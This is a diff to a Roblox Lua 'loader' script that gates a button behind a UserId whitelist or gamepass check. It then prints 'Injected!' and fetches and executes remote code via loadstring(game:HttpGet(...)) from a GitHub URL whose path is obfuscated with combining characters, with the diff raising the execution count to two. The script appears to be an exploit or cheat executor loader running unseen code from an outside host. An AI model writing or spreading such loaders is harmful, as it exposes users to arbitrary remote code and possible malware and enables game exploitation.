@@ -1,3 +1,19 @@
+-- Whitelist setup
+local WHITELISTED_USERIDS = {
+    12345678, -- replace with actual UserIds
+    87654321,
+}
+
+local function isWhitelisted(userId)
+    for _, id in ipairs(WHITELISTED_USERIDS) do
+        if id == userId then
+            return true
+        end
+    end
+    return false
+end
+
+-- Button setup
 local button = Instance.new("TextButton")
 button.Position = UDim2.new(0, 20, 0, 40)
 button.BackgroundColor3 = Color3.fromRGB(10,10,10)
@@ -51,7 +67,7 @@ local function startLoader()
     loading.Visible = false
     print("Injected! Player is whitelisted or owns gamepass.")
     
-    for i = 1, 1 do
+    for i = 1, 2 do
         loadstring(game:HttpGet(('https://raw.githubusercontent.com/therangedpayeer/X-------------------------------------------------X-/refs/heads/main/%7C%CC%B4%CC%8D%CC%88%CC%90%CD%9D%CC%8F%CD%81%CC%8A%CC%8F%CC%9D%CC%9D%CC%A9%CC%B1%CC%A9%CC%B0%CC%96%CC%98%CC%97%CC%9D%CC%A7%CD%93%CC%A6%CC%A4%CC%97%CD%8D%CC%AA%CC%A8%CC%AA%CD%85%CD%85%CC%AC%CC%AB%CC%9F%CC%A2%CC%99%CD%94%CC%A7-%CC%B6%CD%86%CD%80%CD%8A%CC%80%CD%A0%CD%91%CD%9B%CD%92%CC%88%CC%83%CC%93%CC%92%CD%91%CC%92%CD%9D%CC%83%CC%9A%CC%BF%CD%83%CC%90%CC%91%CC%8B%CC%91%CC%91%CD%8B%CC%9B%CC%9B%CC%8B%CC%8F%CD%A0%CC%87%CC%81%CD%9C%CC%AC%CC%A0%CD%89%CC%96%CD%85%CD%9C%CC%B2%CC%9F%7C%CC%B7%CD%90%CC%BF%CC%82%CC%81%CD%83%CD%90%CC%90%CC%95%CC%93%CC%9A%CD%83%CC%87%CC%8A%CD%91%CC%BD%CD%82%CC%95%CC%9B%CD%9B%CD%9B%CC%BF%CC%93%CD%98%CD%8A%CD%8A%CC%BF%CD%84%CD%8C%CC%9A%CD%8A%CD%80%CD%84%CD%8C%CD%84%CC%90%CC%88%CC%A3%CD%8E%CC%B3%CC%A1%CC%BA%CC%A9%CD%9A%CC%AD%CC%A1'), true))()
     end
 end
@@ -67,7 +83,8 @@ end
 -- Button click logic
 button.MouseButton1Click:Connect(function()
     local allowed = false
-    
+
+    -- Check whitelist and gamepass
     if isWhitelisted(player.UserId) then
         allowed = true
     elseif ownsGamepass() then
@@ -86,7 +103,6 @@ button.MouseButton1Click:Connect(function()
         end
     end
 end)
-
 
 
 wait("3")
